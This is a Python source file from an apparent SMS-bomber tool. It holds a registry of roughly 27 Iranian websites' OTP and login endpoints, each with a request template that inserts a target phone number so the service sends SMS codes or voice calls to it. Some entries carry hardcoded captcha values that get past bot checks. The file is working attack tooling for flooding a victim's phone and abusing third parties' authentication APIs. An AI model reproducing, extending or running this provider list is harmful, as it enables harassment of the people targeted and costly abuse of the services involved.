# sms_bomber/api/providers.py
from typing import Dict, List, Any
from dataclasses import dataclass


@dataclass
class Provider:
    """SMS provider configuration."""

    name: str
    url: str
    data_template: Dict[str, Any]
    content_type: str = "json"  # "json" or "form"
    method: str = "POST"  # "POST" or "GET"

    def get_formatted_url(self, phone_number: str) -> str:
        """Generate the URL with phone number substituted."""
        if "{phone}" in self.url:
            return self.url.replace("{phone}", phone_number)
        return self.url

    def get_request_data(self, phone_number: str) -> Dict[str, Any]:
        """Generate request data for the provider."""
        import copy
        
        if isinstance(self.data_template, str):
            # Handle cases where data_template is a string (e.g., plain phone number input)
            return {"phone": self.data_template.format(phone=phone_number)}

        def replace_phone_recursive(obj):
            """Recursively replace {phone} in nested structures."""
            if isinstance(obj, dict):
                result = {}
                for key, value in obj.items():
                    result[key] = replace_phone_recursive(value)
                return result
            elif isinstance(obj, list):
                return [replace_phone_recursive(item) for item in obj]
            elif isinstance(obj, str):
                if "{phone}" in obj:
                    return obj.replace("{phone}", phone_number)
                elif "{phone[1:]}" in obj:
                    return obj.replace("{phone[1:]}", phone_number[1:])
                return obj
            else:
                return obj

        data = copy.deepcopy(self.data_template)
        return replace_phone_recursive(data)


class ProviderRegistry:
    """Registry of SMS providers."""

    def __init__(self):
        self.providers: List[Provider] = []
        self._load_default_providers()

    def _load_default_providers(self) -> None:
        """Load the default list of verified working providers."""
        default_providers = [
            # === VERIFIED WORKING PROVIDERS (17 total) ===
            Provider(
                name="Digikala V1",
                url="https://api.digikala.com/v1/user/authenticate/",
                data_template={"username": "{phone}", "otp_call": False},
            ),
            Provider(
                name="Digikala V2",
                url="https://api.digikala.com/v1/user/forgot/check/",
                data_template={"username": "{phone}"},
            ),
            Provider(
                name="Divar",
                url="https://api.divar.ir/v5/auth/authenticate",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Alibaba",
                url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
                data_template={"phoneNumber": "{phone[1:]}"},
            ),
            Provider(
                name="Sheypoor",
                url="https://www.sheypoor.com/api/v10.0.0/auth/send",
                data_template={"username": "{phone}"},
            ),
            Provider(
                name="GapFilm",
                url="https://core.gapfilm.ir/api/v3.1/Account/Login",
                data_template={"Type": "3", "Username": "{phone[1:]}"},
            ),
            Provider(
                name="Nobat",
                url="https://nobat.ir/api/public/patient/login/phone",
                data_template={"mobile": "{phone[1:]}"},
            ),
            Provider(
                name="Lendo",
                url="https://api.lendo.ir/api/customer/auth/send-otp",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Rojashop",
                url="https://rojashop.com/api/send-otp-register",
                data_template={"mobile": "{phone}", "withOtp": "1"},
                content_type="form",
            ),
            Provider(
                name="Paklean",
                url="https://client.api.paklean.com/download",
                data_template={"tel": "{phone}"},
            ),
            Provider(
                name="Khodro45",
                url="https://khodro45.com/api/v1/customers/otp/",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="DigikalaJet",
                url="https://api.digikalajet.ir/user/login-register/",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Namava",
                url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                data_template={"UserName": "+98{phone[1:]}"},
            ),
            Provider(
                name="BaSalam",
                url="https://auth.basalam.com/captcha/otp-request",
                data_template={"mobile": "{phone}"}
            ),
            Provider(
                name="BitPin",
                url="https://api.bitpin.ir/v3/usr/authenticate/",
                data_template={"password": "jgjhjgdhu87", "mobile": "{phone}", "use_voice_call": True}
            ),
            Provider(
                name="Trip.ir",
                url="https://gateway.trip.ir/api/Totp",
                data_template={"PhoneNumber": "{phone}"},
            ),
            Provider(
                name="Sibche",
                url="https://api.sibche.com/profile/sendCode",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Snapp",
                url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                data_template={"cellphone": "{phone}"},
            ),
            Provider(
                name="Hamrah-Mechanic",
                url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
                data_template={
                    "PhoneNumber": "{phone}",
                    "prevDomainUrl": "https://www.google.com/",
                    "landingPageUrl": "https://www.hamrah-mechanic.com/",
                    "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                    "prevUrl": "https://www.hamrah-mechanic.com/profile/",
                    "referrer": "https://www.google.com/"
                },
            ),
            Provider(
                name="Okala",
                url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Takhfifan",
                url="https://takhfifan.com/v6/api/magento/login/init",
                data_template={"username": "{phone}"}
            ),
            Provider(
                name="Aparat",
                url="https://www.aparat.com/api/fa/v1/user/Authenticate/signup_step1?callbackType=postmessage&theme=light",
                data_template={"account": "{phone}"}
            ),
            Provider(
                name="Karnaval",
                url="https://www.karnaval.ir/api-2/graphql",
                data_template={
                    "query": "\n  mutation AuthCreatePhoneVerificationMutation(\n    $phone: String!\n    $isSecondAttempt: Boolean!\n  ) {\n    requestLoginByPhoneVerification(phone: $phone, isSecondAttempt: $isSecondAttempt) {\n      phone\n    }\n  }\n",
                    "variables": {"phone": "{phone}", "isSecondAttempt": False}
                },
            ),
            Provider(
                name="SnappTrip",
                url="https://platform-api.snapptrip.com/profile/auth/inquiry",
                data_template={"phoneNumber": "{phone}"}
            ),
            Provider(
                name="Delino",
                url="https://www.delino.com/user/register",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Miare",
                url="https://www.miare.ir/api/otp/driver/request/",
                data_template={
                    "phone_number": "{phone}",
                    "captcha_hashkey": "0c87526ea7dd9c6cee5e74632abe0321b4ecca5d",
                    "captcha_code": "WOIE"
                },
            ),
            Provider(
                name="Taaghche",
                url="https://gw.taaghche.com/mybook/v4/site/auth/loginValidation?contact={phone}",
                data_template={},
                method="GET",
            ),
        ]
        self.providers.extend(default_providers)

    def add_provider(self, provider: Provider) -> None:
        """Add a new provider to the registry."""
        self.providers.append(provider)

    def get_all_providers(self) -> List[Provider]:
        """Get all registered providers."""
        return self.providers.copy()
